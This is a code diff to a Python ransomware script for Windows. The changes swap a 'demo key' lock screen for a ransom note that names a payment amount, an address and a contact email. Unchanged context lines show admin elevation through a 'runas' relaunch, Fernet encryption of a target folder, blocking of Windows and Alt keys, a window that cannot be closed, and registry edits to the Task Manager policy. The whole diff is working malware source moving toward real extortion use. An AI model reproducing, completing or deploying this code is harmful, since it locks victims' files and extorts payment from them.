@@ -1,3 +1,11 @@
+# Data to configure
+
+PAYMENT = "1234567890"
+ADDRESS = "1234567890"
+CONTACT = "user@example.com"
+FOLDER_PATH = r"Dummy folder" # Folder to encrypt/decrypt
+KEY = "1234ABCD"
+
 import sys
 import ctypes
 import os
@@ -6,16 +14,11 @@ from tkinter import messagebox
 from cryptography.fernet import Fernet
 import keyboard
 
-# Folder to encrypt/decrypt
-FOLDER_PATH = "Dummy folder"
-
 # Key file location
-KEY_FILE = "encryption.key"
+KEY_FILE = r"encryption.key"
 
 # List of keys to block
 blocked_keys = ['left windows', 'right windows', 'alt', 'alt gr']
-
-DEMO_KEY = "1234ABCD"
 
 def run_as_admin():
     """
@@ -25,7 +28,14 @@ def run_as_admin():
         script = os.path.abspath(sys.argv[0])
         params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
         # Relaunch with admin
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
+        ctypes.windll.shell32.ShellExecuteW(
+            None,                   # handle to parent window (None = default)
+            "runas",                # tells Windows to request admin elevation
+            sys.executable,         # path to Python interpreter or .exe (used to relaunch)
+            f'"{script}" {params}', # full command with the script and its arguments
+            None,                   # current directory (None = current)
+            1                       # window mode (1 = show normal)
+        )
         sys.exit()
 
 def generate_key():
@@ -103,26 +113,31 @@ def ransomware_prompt():
     window.attributes("-fullscreen", True)
     window.configure(bg="black")
 
-    message = tk.Label(window, text="Your computer is LOCKED!\nEnter the DEMO KEY to unlock.",
-                       font=("Arial", 30), fg="red", bg="black")
-    message.pack(expand=True)
+    message = tk.Label(window, text=f"""
+Your computer is LOCKED!
+Enter the KEY to unlock.
+Send {PAYMENT} to the following address:
+{ADDRESS}
+Then contact {CONTACT} with your transaction ID.
+""", font=("Arial", 30), fg="red", bg="black")
+    
+    message.pack(expand=True, fill=tk.BOTH) #Center and expand the message (both horizontally and vertically)
 
     entry = tk.Entry(window, font=("Arial", 24), justify='center')
     entry.pack(pady=20)
 
     def validate_key():
-        if entry.get() == DEMO_KEY:
-            messagebox.showinfo("Unlocked", "Correct key! Demo ended.")
+        if entry.get() == KEY:
+            messagebox.showinfo("Unlocked", "Correct Key Entered!")
             decrypt_folder(FOLDER_PATH, load_key())
             # Re-enable Task Manager
             os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f')
             window.destroy()
             exit(0)  # Exit the program
         else:
-            messagebox.showerror("Incorrect Key", "Wrong DEMO KEY! Try again.")
+            messagebox.showerror("Incorrect Key", "Wrong Key Entered!\nPayment required to unlock.")
 
-    submit_btn = tk.Button(window, text="Submit Key", command=validate_key,
-                           font=("Arial", 20), bg="red", fg="white")
+    submit_btn = tk.Button(window, text="Submit Key", command=validate_key, font=("Arial", 20), bg="red", fg="white")
     submit_btn.pack(pady=10)
 
     window.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable window close
